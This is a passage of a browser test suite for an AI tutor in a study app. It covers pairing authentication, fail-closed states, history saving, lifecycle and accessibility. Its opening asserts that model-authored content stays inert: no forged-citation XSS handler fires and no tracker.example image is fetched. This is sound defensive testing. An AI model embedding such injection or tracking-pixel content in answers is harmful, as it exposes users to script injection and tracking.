    await new Promise((resolve) => setTimeout(resolve, 400));
    assert.equal(await page.evaluate(() => window.location.hash), "#/ai", "a model-authored link to an app route navigated");
    assert.equal(await page.evaluate(() => window.__lumenForgedCitationXss === true), false, "a model-authored event handler ran");
    const tutorInert = await page.$$eval(".ai-tutor__message--assistant .ai-tutor__response-text", inertReport, forgedLabel, "");
    assert.equal(tutorInert.images, 0, "the tutor answer rendered an <img>");
    assert.deepEqual(tutorInert.appLinks, [], "the tutor answer linked to the app's own host");
    assert.deepEqual(tutorInert.trackerLinks, ["Image: Tracking pixel (tracker.example)"], "the remote image was not shown as a link");
    assert.match(await page.$eval(".ai-tutor__message--assistant .ai-tutor__response-text", (node) => node.textContent), /Same host: Open the app copy\./, "the same-host link lost its label");

    // Issue #81: the saved answer stays inert in the Notebook and in a review
    // card made from it; AI flashcards stay inert in Review.
    await clickByText(page, ".ai-tutor__message--assistant .ai-tutor__message-actions button", "Save to notes");
    await page.waitForFunction(() => new Promise((resolve) => {
      const request = indexedDB.open("lumen-ai-notes", 1);
      request.onerror = () => resolve(false);
      request.onsuccess = () => {
        const get = request.result.transaction("study-data", "readonly").objectStore("study-data").get("profile");
        get.onerror = () => resolve(false);
        get.onsuccess = () => resolve((get.result?.clippings || []).some((clip) => clip.origin === "ai-tutor"));
      };
    }), { timeout: 8_000 });
    await page.evaluate(() => { location.hash = "#/notebook"; });
    await page.waitForSelector(".clipping-card--ai blockquote", { timeout: 10_000 });
    assertInert(await page.$$eval(".clipping-card--ai", inertReport, forgedLabel, "blockquote"), "Notebook clipping", { trackerLinks: [] });
    await page.$eval(".clipping-card--ai button[aria-label^='Create review card']", (button) => button.click());
    await page.waitForSelector(".review-card-dialog", { timeout: 10_000 });
    assert.match(await page.$eval(".review-card-dialog input.text-input", (input) => input.value), /^ai-draft\b/, "a card made from an AI clipping lost its ai-draft provenance");
    assert.ok(await page.$(".review-card-dialog .review-ai-note"), "the review dialog did not say the card is an AI draft");
    await clickByText(page, ".review-card-dialog button", "Preview");
    await page.waitForSelector(".review-markdown-preview", { timeout: 5_000 });
    assertInert(await page.$$eval(".review-markdown-preview", inertReport, forgedLabel, ".review-markdown"), "Review card preview", { trackerLinks: ["Image: Tracking pixel (tracker.example)"] });
    await clickByText(page, ".review-card-dialog button", "Add to review");
    await page.waitForFunction(() => !document.querySelector(".review-card-dialog"), { timeout: 8_000 });

    await page.evaluate(() => { location.hash = "#/ai"; });
    await page.waitForSelector(".ai-tutor__connection--ready", { timeout: 10_000 });
    await clickByText(page, ".ai-tutor__mode-tabs button", "Flashcards");
    await page.$eval(".ai-tutor__composer textarea", (field) => {
      Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value").set.call(field, "Make a flashcard about holdout leakage.");
      field.dispatchEvent(new Event("input", { bubbles: true }));
    });
    if (await page.$(".ai-tutor__consent input")) await page.click(".ai-tutor__consent input");
    await page.$eval(sendSelector, (button) => button.click());
    await page.waitForSelector(".ai-tutor__flashcards", { timeout: 15_000 });
    await clickByText(page, ".ai-tutor__flashcard button", "Reveal answer");
    await page.waitForSelector(".ai-tutor__flashcard-answer", { timeout: 5_000 });
    assertInert(await page.$$eval(".ai-tutor__flashcard", inertReport, forgedLabel, ".ai-tutor__inline-md"), "Tutor flashcard", { trackerLinks: ["Image: Card pixel (tracker.example)"] });
    await page.$$eval(".ai-tutor__flashcards", (nodes) => [...nodes.at(-1).querySelectorAll("button")].find((button) => /to review/i.test(button.textContent))?.click());
    await page.waitForSelector(".ai-tutor__draft-status.is-saved", { timeout: 8_000 });

    await page.evaluate(() => { location.hash = "#/review"; });
    await page.waitForFunction(() => document.querySelectorAll(".review-deck-card").length >= 2, { timeout: 10_000 });
    assertInert(await page.$$eval(".review-deck-card", inertReport, "Same host: Open the app copy", ".review-markdown"), "Review card from the saved answer", { trackerLinks: ["Image: Tracking pixel (tracker.example)"] });
    assertInert(await page.$$eval(".review-deck-card", inertReport, "Which control is real?", ".review-markdown"), "AI flashcard in Review", { trackerLinks: ["Image: Card pixel (tracker.example)"] });
    const deckTags = await page.$$eval(".review-deck-card .review-tags", (nodes) => nodes.map((node) => node.textContent));
    assert.equal(deckTags.filter((tags) => tags.startsWith("ai-draft")).length, 2, `saved AI cards lost their ai-draft tag: ${JSON.stringify(deckTags)}`);
    await new Promise((resolve) => setTimeout(resolve, 300));
    assert.deepEqual(trackerRequests, [], "a remote image in model text was fetched");
    await page.close();
  } finally {
    await forgedContext.close();
  }

  // Pairing-protected servers (AI_AUTH=pairing) must gate generation behind
  // the one-time pairing flow with actionable errors (P0-5).
  let pairingSessionActive = false;
  const pairingConfigFactory = () => ({
    ...secureConfig,
    auth: { mode: "pairing", pairEndpoint: "/api/auth/pair", required: true, sessionActive: pairingSessionActive },
  });
  const pairing = await newAuditPage("pairing", pairingConfigFactory, {
    pairResponder: (body) => {
      if (body.code === "correct-horse-battery") {
        pairingSessionActive = true;
        return { status: 200, payload: { ok: true, requestId: "audit-pair", expiresAt: new Date(Date.now() + 3_600_000).toISOString() } };
      }
      return { status: 401, payload: { ok: false, requestId: "audit-pair", error: { code: "PAIRING_CODE_INVALID", message: "That pairing code does not match this server. Check it with the server operator." } } };
    },
  });
  await pairing.page.goto(`${baseUrl}#/ai`, { waitUntil: "networkidle2", timeout: 30_000 });
  await pairing.page.waitForSelector(".ai-tutor__connection--pairing", { timeout: 10_000 });
  assert.equal(await pairing.page.$eval(sendSelector, (button) => button.disabled), true, "an unpaired browser could still send AI requests");
  await pairing.page.waitForSelector(".ai-tutor__pairing input", { timeout: 5_000 });
  await pairing.page.type(".ai-tutor__pairing input", "wrong-guess");
  await pairing.page.$eval(".ai-tutor__pairing button[type='submit']", (button) => button.click());
  await pairing.page.waitForSelector(".ai-tutor__pairing-error", { timeout: 8_000 });
  assert.match(await pairing.page.$eval(".ai-tutor__pairing-error", (node) => node.textContent), /does not match/i, "a rejected pairing code did not explain itself");
  assert.deepEqual(await pairing.page.$eval(".ai-tutor__pairing input", (input) => ({
    invalid: input.getAttribute("aria-invalid"),
    describedByError: document.getElementById(input.getAttribute("aria-describedby") || "")?.classList.contains("ai-tutor__pairing-error") === true,
  })), { invalid: "true", describedByError: true }, "the rejected pairing code was not linked to its error");
  await pairing.page.waitForFunction(() => document.activeElement === document.querySelector(".ai-tutor__pairing input"), { timeout: 3_000 }).catch(() => assert.fail("a rejected pairing code did not return focus to the code field"));
  assert.equal(await pairing.page.$$eval(":is(.ai-tutor__options-toggle, .ai-tutor__consent-card, .tutor-sheet)", (nodes) => nodes.length), 0, "the pairing state still offered request options or the disclosure");
  await pairing.page.$eval(".ai-tutor__pairing input", (input) => { input.value = ""; });
  await pairing.page.type(".ai-tutor__pairing input", "correct-horse-battery");
  await pairing.page.$eval(".ai-tutor__pairing button[type='submit']", (button) => button.click());
  await pairing.page.waitForSelector(".ai-tutor__connection--ready", { timeout: 10_000 });
  assert.equal(pairing.calls.pair.length, 2, "pairing attempts were not sent exactly twice");
  assert.equal(pairing.calls.respond.length, 0, "an unpaired browser reached the AI response endpoint");
  assert.equal(await pairing.page.$(".ai-tutor__pairing"), null, "the pairing panel remained after a successful pairing");
  assert.equal(await pairing.page.evaluate(() => document.activeElement?.tagName), "H2", "successful pairing left focus on <body>");
  await pairing.page.close();

  // A server from an older build advertises no request contract. The UI must
  // fail closed with restart guidance instead of a misleading Ready state.
  const { requestContract: _omitted, ...skewedConfig } = secureConfig;
  const skewed = await newAuditPage("contract-skew", () => skewedConfig);
  await skewed.page.goto(`${baseUrl}#/ai`, { waitUntil: "networkidle2", timeout: 30_000 });
  await skewed.page.waitForSelector(".ai-tutor__connection--error", { timeout: 10_000 });
  const skewMessage = await skewed.page.$eval(".ai-tutor__connection--error", (node) => node.textContent.replace(/\s+/g, " "));
  assert.match(skewMessage, /different versions/i, "version-skewed server did not produce the contract-mismatch guidance");
  assert.match(skewMessage, /restart the integrated Lumen server/i, "contract-mismatch state did not tell the operator how to recover");
  assert.equal(await skewed.page.$(".ai-tutor__connection--ready"), null, "version-skewed server still reported Ready");
  assert.equal(await skewed.page.$eval(sendSelector, (button) => button.disabled), true, "version-skewed configuration did not fail closed");
  assert.equal(skewed.calls.respond.length, 0, "version-skewed configuration reached the AI response endpoint");
  await skewed.page.close();

  const disabledConfig = { ...secureConfig, enabled: false, model: null, unavailableReason: "server_not_configured" };
  const disabled = await newAuditPage("disabled", () => disabledConfig);
  await disabled.page.goto(`${baseUrl}#/ai`, { waitUntil: "networkidle2", timeout: 30_000 });
  await disabled.page.waitForSelector(".ai-tutor__connection--disabled", { timeout: 10_000 });
  assert.match(await disabled.page.$eval(".ai-tutor__connection--disabled", (node) => node.textContent), /not configured on this server/i);
  assert.equal(await disabled.page.$eval(sendSelector, (button) => button.disabled), true, "server-disabled AI did not disable generation");
  // A server without AI shows one focused card and a reason next to the
  // disabled Generate button instead of the whole composer.
  assert.match(await disabled.page.$eval(".ai-tutor__setup-card", (node) => node.textContent), /not set up on this server/i, "the AI-disabled state did not explain itself");
  assert.deepEqual(await disabled.page.$$eval(":is(.ai-tutor__options-toggle, .ai-tutor__consent-card, .tutor-sheet)", (nodes) => nodes.length), 0, "the AI-disabled state still offered request options or the disclosure");
  assert.equal(await disabled.page.$(":is(.ai-tutor__mode-tabs, .ai-tutor__mode-select)"), null, "the AI-disabled state still offered study modes");
  assert.match(await disabled.page.$eval(".ai-tutor__disabled-reason", (node) => node.textContent), /not set up on this server/i, "the disabled Generate button had no reason");
  await clickByText(disabled.page, ".ai-tutor__connection button", "Check again");
  await disabled.page.waitForFunction(() => document.querySelector(".ai-tutor__connection--disabled"), { timeout: 8_000 });
  assert.ok(disabled.calls.config.length >= 2, "disabled-state configuration retry did not recheck the server");
  assert.equal(disabled.calls.respond.length, 0, "disabled configuration reached the AI response endpoint");
  await disabled.page.close();

  // One tab must save each Library-first turn exactly once. Retrieval updates
  // the pending user turn; with IndexedDB commits slowed, a save that captured
  // its merge base before the previous commit cloned that turn as a
  // sync-conflict record and raised a false "concurrent tab change" warning.
  const singleTabContext = await browser.createBrowserContext();
  try {
    const page = await singleTabContext.newPage();
    await page.setViewport({ width: 393, height: 852, deviceScaleFactor: 1, isMobile: true, hasTouch: true });
    attachDiagnostics(page, "single-tab-history");
    await page.evaluateOnNewDocument(() => {
      try { localStorage.setItem("lumen.ai.local-disclosure-ack.v1", "acknowledged"); } catch { /* consent can still be given in the UI */ }
      const delayMs = 400;
      const descriptor = Object.getOwnPropertyDescriptor(IDBTransaction.prototype, "oncomplete");
      Object.defineProperty(IDBTransaction.prototype, "oncomplete", {
        configurable: true,
        get() { return descriptor.get.call(this); },
        set(listener) { descriptor.set.call(this, typeof listener === "function" ? (event) => setTimeout(() => listener.call(this, event), delayMs) : listener); },
      });
      const addEventListener = EventTarget.prototype.addEventListener;
      IDBTransaction.prototype.addEventListener = function delayedComplete(type, listener, options) {
        if (type === "complete" && typeof listener === "function") return addEventListener.call(this, type, (event) => setTimeout(() => listener.call(this, event), delayMs), options);
        return addEventListener.call(this, type, listener, options);
      };
      window.__lumenAuditToasts = [];
      document.addEventListener("DOMContentLoaded", () => new MutationObserver(() => {
        document.querySelectorAll(".toast").forEach((node) => {
          const text = node.textContent.replace(/\s+/g, " ").trim();
          if (text && !window.__lumenAuditToasts.includes(text)) window.__lumenAuditToasts.push(text);
        });
      }).observe(document.body, { subtree: true, childList: true, characterData: true }));
    });
    const calls = await installAiMocks(page, () => secureConfig);
    await page.goto(`${baseUrl}#/ai`, { waitUntil: "networkidle2", timeout: 30_000 });
    await page.waitForSelector(".ai-tutor__connection--ready", { timeout: 10_000 });
    const turns = 3;
    for (let turn = 1; turn <= turns; turn += 1) {
      await page.$eval(".ai-tutor__composer textarea", (field, value) => {
        Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value").set.call(field, value);
        field.dispatchEvent(new Event("input", { bubbles: true }));
      }, `Single-tab turn ${turn}: why does repeated holdout inspection leak evaluation information?`);
      await page.waitForFunction((selector) => document.querySelector(selector)?.disabled === false, { timeout: 8_000 }, sendSelector);
      await page.$eval(sendSelector, (button) => button.click());
      await page.waitForFunction((count) => document.querySelectorAll(".ai-tutor__message--assistant:not(.ai-tutor__message--streaming)").length >= count
        && !document.querySelector(".ai-tutor__message--streaming"), { timeout: 15_000 }, turn);
    }
    assert.equal(calls.respond.length, turns, "single-tab history scenario did not send one request per turn");
    await waitForStoredHistory(page, turns * 2);
    // Let every queued save and its slowed commit drain before counting.
    await new Promise((resolve) => setTimeout(resolve, 2_500));
    const storedSingleTab = await readProfile(page);
    const storedRoles = storedSingleTab.aiTutorHistory.map((message) => message.role);
    assert.equal(storedRoles.filter((role) => role === "user").length, turns, `single-tab Library-first turns stored duplicate user messages: ${JSON.stringify(storedSingleTab.aiTutorHistory.map((message) => `${message.role}:${message.id}`))}`);
    assert.equal(storedRoles.filter((role) => role === "assistant").length, turns, "single-tab Library-first turns did not store exactly one answer each");
    assert.equal(storedSingleTab.aiTutorHistory.some((message) => String(message.id).startsWith("sync-conflict-")), false, "a single tab cloned its own tutor turn as a sync conflict");
    assert.deepEqual(storedSingleTab.syncMeta?.conflicts || [], [], "a single tab recorded a concurrent-tab conflict against itself");
    assert.equal(await page.$$eval(".ai-tutor__message--user", (nodes) => nodes.length), turns, "the conversation showed a duplicated user turn");
    const conflictToasts = await page.evaluate(() => window.__lumenAuditToasts.filter((text) => /concurrent tab/i.test(text)));
    assert.deepEqual(conflictToasts, [], "a single tab showed a false concurrent-tab warning");

    // Library first must ground "explain this lesson" in the open lesson even
    // though that generic wording matches other chapters better.
    const lessonId = "notes/part-05-supervised-learning/01-linear-regression.md";
    await page.evaluate((id) => { window.location.hash = `#/read/${encodeURIComponent(id)}`; }, lessonId);
    await page.waitForSelector(".reader-scroll .markdown-body h2, .markdown-body h2", { timeout: 15_000 });
    await page.evaluate(() => { window.location.hash = "#/ai"; });
    await page.waitForSelector(".ai-tutor__connection--ready", { timeout: 10_000 });
    assert.match(await page.$eval(".ai-tutor__source-panel-toggle small", (node) => node.textContent), /Library first · all lessons/, "the Library-first summary implied an attached lesson");
    assert.match(await page.$eval(".ai-tutor__source--open", (node) => node.textContent), /Linear Regression/, "the open lesson was not shown in Library first");
    assert.equal(await page.$eval(".ai-tutor__composer textarea", (field) => field.value), "Explain the key ideas in this lesson with a short example and one common mistake.");
    await page.$eval(sendSelector, (button) => button.click());
    await page.waitForFunction((count) => document.querySelectorAll(".ai-tutor__message--assistant:not(.ai-tutor__message--streaming)").length >= count && !document.querySelector(".ai-tutor__message--streaming"), { timeout: 15_000 }, turns + 1);
    const lessonContext = String(calls.respond.at(-1).body.context);
    const lessonBlocks = [...lessonContext.matchAll(/^\[S\d+\] ([^\n]*)/gm)].map((match) => match[1]);
    assert.match(lessonBlocks[0] || "", /Linear Regression/, `the open lesson did not lead the Library-first evidence: ${JSON.stringify(lessonBlocks)}`);
    assert.ok(lessonBlocks.filter((title) => /Linear Regression/.test(title)).length >= 4, `too few open-lesson passages were attached: ${JSON.stringify(lessonBlocks)}`);
    await clickByText(page, ".ai-tutor__message--assistant:last-of-type .ai-tutor__message-actions button", "Approach");
    assert.match(await page.$eval(".ai-tutor__message--assistant:last-of-type .ai-tutor__approach", (node) => node.textContent), /from the open lesson/i, "the Approach panel did not disclose the reserved open-lesson passages");

    // Choose sources lists the whole catalog and loads a lesson when ticked.
    await page.click(".ai-tutor__source-panel-toggle");
    await clickByText(page, ".ai-tutor__source-modes button", "Choose sources");
    assert.ok((await page.$$(".ai-tutor__source-list .ai-tutor__source")).length >= 143, "Choose sources did not list the full library");
    await page.type(".ai-tutor__source-tools input", "logistic");
    await page.waitForFunction(() => [...document.querySelectorAll(".ai-tutor__source-list .ai-tutor__source strong")].some((node) => /Logistic Regression/.test(node.textContent)));
    await page.$eval(".ai-tutor__source-list .ai-tutor__source input", (input) => input.click());
    await page.waitForFunction(() => /characters/.test(document.querySelector(".ai-tutor__source-list .ai-tutor__source")?.textContent || ""), { timeout: 10_000 });
    assert.equal(await page.$eval(".ai-tutor__count", (node) => node.textContent), "2/8", "a ticked catalog lesson was not attached");
    await page.$eval(".ai-tutor__source-tools input", (input) => {
      Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value").set.call(input, "zzqq-no-such-lesson");
      input.dispatchEvent(new Event("input", { bubbles: true }));
    });
    assert.match(await page.$eval(".ai-tutor__empty-filter", (node) => node.textContent), /No lessons match/, "an empty source filter showed no message");
  } finally {
    await singleTabContext.close();
  }

  // Tutor lifecycle (issue #56). A Reader "Ask AI" excerpt is applied once,
  // never overwrites an unsent draft, and lands focused in view; the draft and
  // the engine choice survive route changes; leaving mid-answer leaves a
  // visible incomplete turn that never reaches model memory; flashcard adds
  // report duplicates honestly; a configuration refresh keeps the learner's
  // one-request web permission.
  const lifecycleContext = await browser.createBrowserContext();
  try {
    const page = await lifecycleContext.newPage();
    await page.setViewport({ width: 393, height: 852, deviceScaleFactor: 1, isMobile: true, hasTouch: true });
    attachDiagnostics(page, "tutor-lifecycle");
    await page.evaluateOnNewDocument(() => {
      try { localStorage.setItem("lumen.ai.local-disclosure-ack.v1", "acknowledged"); } catch { /* consent can still be given in the UI */ }
    });
    const calls = await installAiMocks(page, () => secureConfig, { responseDelayMs: 1_200 });
    const lessonId = "notes/part-05-supervised-learning/01-linear-regression.md";
    const promptValue = () => page.$eval(".ai-tutor__composer textarea", (field) => field.value);
    const setPrompt = (value) => page.$eval(".ai-tutor__composer textarea", (field, text) => {
      Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value").set.call(field, text);
      field.dispatchEvent(new Event("input", { bubbles: true }));
    }, value);
    const waitForAnswers = (count) => page.waitForFunction((expected) => document.querySelectorAll(".ai-tutor__message--assistant:not(.ai-tutor__message--streaming)").length >= expected
      && !document.querySelector(".ai-tutor__message--streaming"), { timeout: 15_000 }, count);
    const visit = async (hash, selector) => {
      await page.evaluate((target) => { window.location.hash = target; }, hash);
      await page.waitForSelector(selector, { timeout: 15_000 });
    };
    // Fully visible between the fixed top bar and the phone's bottom bar.
    const waitForRevealedField = (selector, message) => page.waitForFunction((fieldSelector) => {
      const field = document.querySelector(fieldSelector);
      const box = field?.getBoundingClientRect();
      const top = Math.max(0, document.querySelector(".app-topbar")?.getBoundingClientRect().bottom ?? 0);
      const nav = document.querySelector(".bottom-nav");
      const bottom = nav && getComputedStyle(nav).display !== "none" ? nav.getBoundingClientRect().top : innerHeight;
      return document.activeElement === field && box.top >= top && box.bottom <= bottom;
    }, { timeout: 5_000 }, selector).catch(() => assert.fail(message));
    const askAiFromLesson = async ({ field = ".ai-tutor__composer textarea", ready = ".ai-tutor__connection--ready" } = {}) => {
      await visit(`#/read/${encodeURIComponent(lessonId)}`, ".markdown-body p");
      await page.$eval(".markdown-body", (article) => {
        const paragraph = [...article.querySelectorAll("p")].find((node) => node.textContent.trim().length > 80);
        const range = document.createRange();
        range.selectNodeContents(paragraph);
        window.getSelection().removeAllRanges();
        window.getSelection().addRange(range);
        document.dispatchEvent(new Event("selectionchange"));
      });
      await page.waitForFunction(() => [...document.querySelectorAll(".document-tools button")].some((button) => button.classList.contains("selection-ready") && button.textContent.includes("Ask AI")), { timeout: 5_000 });
      await clickByText(page, ".document-tools button", "Ask AI");
      await page.waitForSelector(ready, { timeout: 15_000 });
      await page.waitForFunction((selector) => document.querySelector(selector)?.value.includes("Explain this excerpt"), { timeout: 5_000 }, field);
    };

    await page.goto(`${baseUrl}#/ai`, { waitUntil: "networkidle2", timeout: 30_000 });
    await page.waitForSelector(".ai-tutor__connection--ready", { timeout: 10_000 });

    await askAiFromLesson();
    assert.match(await promptValue(), /^Explain this excerpt from my lecture “[^”]+” in context:/, "Ask AI did not name the source lecture");
    await waitForRevealedField(".ai-tutor__composer textarea", "Ask AI did not reveal and focus the composer");
    assert.match(await page.$eval(".ai-tutor__composer-notice", (node) => node.textContent), /excerpt from “[^”]+”/, "Ask AI did not tell the learner which lecture the excerpt came from");
    await page.$eval(sendSelector, (button) => button.click());
    await waitForAnswers(1);
    await visit("#/library", ".library-page");
    await visit("#/ai", ".ai-tutor__connection--ready");
    assert.doesNotMatch(await promptValue(), /Explain this excerpt/, "a sent Ask AI excerpt came back after the tutor remounted");

    // An unsent draft, its mode and its grounding survive a route change.
    await chooseMode(page, "Quiz");
    await page.click(".ai-tutor__source-panel-toggle");
    await clickByText(page, ".ai-tutor__source-modes button", "No library");
    const draft = "My unsent draft about ridge penalties";
    await setPrompt(draft);
    await visit("#/library", ".library-page");
    await visit("#/ai", ".ai-tutor__connection--ready");
    assert.equal(await promptValue(), draft, "an unsent draft was lost on a route change");
    assert.equal(await activeMode(page), "Quiz", "the draft's mode was lost on a route change");
    assert.match(await page.$eval(".ai-tutor__source-panel-toggle small", (node) => node.textContent), /^No library/, "the draft's grounding was lost on a route change");

    // A new excerpt is added below the learner's draft, not over it.
    await askAiFromLesson();
    const combined = await promptValue();
    assert.ok(combined.startsWith(draft) && combined.includes("Explain this excerpt from my lecture"), `Ask AI overwrote the learner's draft: ${combined.slice(0, 200)}`);
    assert.match(await page.$eval(".ai-tutor__composer-notice", (node) => node.textContent), /unsent question was kept/i);

    // Leaving mid-answer records the interrupted turn visibly; it is never
    // sent back to the model as memory. No library shows the source-free wait.
    await chooseMode(page, "Explain");
    const interruptedPrompt = "Lifecycle check: explain weight decay.";
    await setPrompt(interruptedPrompt);
    const answersBefore = await page.$$eval(".ai-tutor__message--assistant", (nodes) => nodes.length);
    await page.$eval(sendSelector, (button) => button.click());
    await page.waitForSelector(".ai-tutor__message--streaming", { timeout: 5_000 });
    assert.match(await page.$eval(".ai-tutor__stream-actions", (node) => node.textContent), /Waiting for the first token/, "a No-library request did not show the source-free waiting text");
    await visit("#/library", ".library-page");
    const interruptDeadline = Date.now() + 8_000;
    let interruptedStored = null;
    while (Date.now() < interruptDeadline && !interruptedStored) {
      interruptedStored = (await readProfile(page))?.aiTutorHistory?.find((message) => message.role === "assistant" && message.incomplete === true) || null;
      if (!interruptedStored) await new Promise((resolve) => setTimeout(resolve, 100));
    }
    assert.ok(interruptedStored, "leaving mid-answer did not record the interrupted turn");
    await visit("#/ai", ".ai-tutor__connection--ready");
    await page.waitForFunction((count) => document.querySelectorAll(".ai-tutor__message--assistant").length > count, { timeout: 5_000 }, answersBefore);
    const roles = await page.$$eval(".ai-tutor__messages > .ai-tutor__message", (nodes) => nodes.map((node) => node.classList.contains("ai-tutor__message--user") ? "user" : "assistant"));
    assert.equal(roles.filter((role) => role === "user").length, roles.filter((role) => role === "assistant").length, `leaving mid-answer left an unanswered question: ${roles.join(",")}`);
    assert.match(await page.$eval(".ai-tutor__messages > .ai-tutor__message:last-child", (node) => node.textContent), /Stopped early/, "the interrupted answer was not marked incomplete");
    await setPrompt("Lifecycle follow-up: what does weight decay penalize?");
    const requestsBefore = calls.respond.length;
    await page.$eval(sendSelector, (button) => button.click());
    await waitForAnswers(answersBefore + 2);
    const followUp = calls.respond[requestsBefore]?.body;
    assert.ok(followUp, "the follow-up request was not sent");
    assert.equal(JSON.stringify(followUp.history).includes("interrupted"), false, "an interrupted placeholder was sent to the model as memory");
    assert.equal(followUp.history.some((message) => message.content.includes(interruptedPrompt)), false, "an unanswered question was sent to the model as memory");

    // Flashcards: success is reflected on the button; duplicates are reported
    // as already in Review, never as a failure.
    await chooseMode(page, "Flashcards");
    await page.$eval(sendSelector, (button) => button.click());
    await waitForAnswers(answersBefore + 3);
    await page.waitForSelector(".ai-tutor__flashcards", { timeout: 8_000 });
    const addCards = () => page.$$eval(".ai-tutor__flashcards", (nodes) => [...nodes.at(-1).querySelectorAll("button")].find((button) => /to review|in review/i.test(button.textContent))?.click());
    await addCards();
    await page.waitForSelector(".ai-tutor__draft-status.is-saved", { timeout: 8_000 });
    assert.match(await page.$$eval(".ai-tutor__flashcards", (nodes) => nodes.at(-1).querySelector(".ai-tutor__button--primary").textContent), /Added to Review/, "the add button did not reflect success");
    await addCards();
    await new Promise((resolve) => setTimeout(resolve, 300));
    assert.equal(await page.$(".ai-tutor__draft-status.is-error"), null, "a repeated add reported a failure");
    await setPrompt("Create the same flashcards again.");
    await page.$eval(sendSelector, (button) => button.click());
    await waitForAnswers(answersBefore + 4);
    await page.waitForFunction(() => document.querySelectorAll(".ai-tutor__flashcards").length >= 2, { timeout: 8_000 });
    await addCards();
    await page.waitForSelector(".ai-tutor__draft-status.is-exists", { timeout: 8_000 });
    assert.match(await page.$eval(".ai-tutor__draft-status.is-exists", (node) => node.textContent), /Already in Review/, "duplicate cards were not reported as already in Review");
    assert.equal(await page.$(".ai-tutor__draft-status.is-error"), null, "duplicate cards were reported as a failure");
    assert.equal((await readProfile(page)).reviewItems.filter((item) => (item.tags || []).includes("ai-draft")).length, flashcardData.cards.length, "duplicate flashcards were saved twice");

    // A configuration refresh keeps the armed one-request web permission.
    await chooseMode(page, "Explain");
    await clickByText(page, ".ai-tutor__source-modes button", "Library first");
    await withOptions(page, () => page.$eval(".ai-tutor__web-search input", (input) => input.click()));
    const configChecks = calls.config.length;
    await page.waitForSelector(".ai-tutor__connection--ready", { timeout: 8_000 }).catch(async (error) => {
      error.message += `\nPage: ${await page.evaluate(() => `${location.hash} ${document.querySelector(".ai-tutor__connection")?.className || "no tutor"} ${document.body.innerText.slice(0, 600)}`)}\nRuntime errors: ${runtimeErrors.join(" | ") || "none"}`;
      throw error;
    });
    await clickByText(page, ".ai-tutor__connection button", "Refresh");
    await page.waitForFunction(() => document.querySelector(".ai-tutor__connection--ready"), { timeout: 8_000 });
    assert.ok(calls.config.length > configChecks, "Refresh did not recheck the server");
    await withOptions(page, async () => {
      assert.equal(await page.$eval(".ai-tutor__web-search input", (input) => input.checked), true, "a configuration refresh silently withdrew the learner's web permission");
      await page.$eval(".ai-tutor__web-search input", (input) => input.click());
    });

    // The engine choice is remembered across route changes.
    await page.$eval('[data-ai-engine-option="phone-local"]', (button) => button.click());
    await page.waitForFunction(() => document.querySelector(".ai-learning-studio")?.dataset.aiEngine === "phone-local");
    await visit("#/library", ".library-page");
    await visit("#/ai", ".ai-learning-studio");
    assert.equal(await page.$eval(".ai-learning-studio", (node) => node.dataset.aiEngine), "phone-local", "the engine choice reset on a route change");
    // Ask AI reaches On-device Lite too, and its composer stays in view while
    // the device panel above it finishes loading.
    await askAiFromLesson({ field: ".phone-tutor textarea", ready: ".phone-tutor textarea" });
    assert.match(await page.$eval(".phone-tutor textarea", (field) => field.value), /^Explain this excerpt from my lecture “[^”]+” in context:/, "Ask AI did not name the lecture in On-device Lite");
    await waitForRevealedField(".phone-tutor textarea", "Ask AI did not reveal and focus the On-device composer");
    await new Promise((resolve) => setTimeout(resolve, 1_000));
    await waitForRevealedField(".phone-tutor textarea", "the On-device composer slid out of view after Ask AI");
    await page.$eval('[data-ai-engine-option="mac-local"]', (button) => button.click());
    await page.waitForSelector(".ai-tutor__connection--ready", { timeout: 10_000 });
  } finally {
    await lifecycleContext.close();
  }

  // Keyboard and screen-reader flow (issue #56): focus never falls to <body>
  // after Generate, completion, Stop or Clear; progress is announced once per
  // phase in one persistent region and the elapsed counter is not live; wide
  // tables and equations are keyboard-scrollable; the grounding radiogroup
  // moves with arrow keys; answers never extend the page with blank space;
  // Clear uses an in-app dialog that traps and restores focus.
  const keyboardContext = await browser.createBrowserContext();
  try {
    const page = await keyboardContext.newPage();
    await page.setViewport({ width: 393, height: 852, deviceScaleFactor: 1, isMobile: true, hasTouch: true });
    attachDiagnostics(page, "tutor-keyboard");
    await page.evaluateOnNewDocument(() => {
      try { localStorage.setItem("lumen.ai.local-disclosure-ack.v1", "acknowledged"); } catch { /* consent can still be given in the UI */ }
    });
    await installSlowStream(page);
    const wideAnswer =(citation) => `## Wide evidence\n\nRepeated holdout inspection leaks information. [${citation}]\n\n| Signal | Risk | Mitigation that is deliberately long | Owner |\n| --- | --- | --- | --- |\n| Repeated inspection | Optimistic estimate | Freeze every choice before the final look | Evaluation lead |\n\n$$\n\\hat{w} = \\arg\\min_w \\sum_{i=1}^{n}(y_i - x_i^T w)^2 + \\lambda \\lVert w \\rVert_2^2 + \\gamma \\lVert w \\rVert_1 + \\text{a deliberately long tail term}\n$$\n\nDone.`;
    await installAiMocks(page, () => secureConfig, { responseDelayMs: 900, answerText: wideAnswer });
    await page.goto(`${baseUrl}#/ai`, { waitUntil: "networkidle2", timeout: 30_000 });
    await page.waitForSelector(".ai-tutor__connection--ready", { timeout: 10_000 });
    const setPrompt = (value) => page.$eval(".ai-tutor__composer textarea", (field, text) => {
      Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value").set.call(field, text);
      field.dispatchEvent(new Event("input", { bubbles: true }));
    }, value);
    const activeElement = () => page.evaluate(() => {
      const node = document.activeElement;
      return { tag: node?.tagName || "", className: String(node?.className || ""), text: node?.textContent?.replace(/\s+/g, " ").trim().slice(0, 60) || "", label: node?.getAttribute?.("aria-label") || "" };
    });
    const announcement = () => page.$eval(".ai-tutor > p.visually-hidden[role='status']", (node) => node.textContent.trim());

    // On a touch screen Return stays a new line; Send is the button. No
    // keyboard hint is shown there.
    assert.equal(await page.$(".ai-tutor__key-hint"), null, "a phone showed the keyboard hint");
    await setPrompt("Phone line");
    await page.$eval(".ai-tutor__composer textarea", (field) => { field.focus(); field.setSelectionRange(field.value.length, field.value.length); });
    await page.keyboard.press("Enter");
    await new Promise((resolve) => setTimeout(resolve, 300));
    assert.equal(await page.$eval(".ai-tutor__composer textarea", (field) => field.value), "Phone line\n", "Return did not start a new line on a phone");
    assert.equal(await page.$(".ai-tutor__message--streaming"), null, "Return sent the question on a phone");

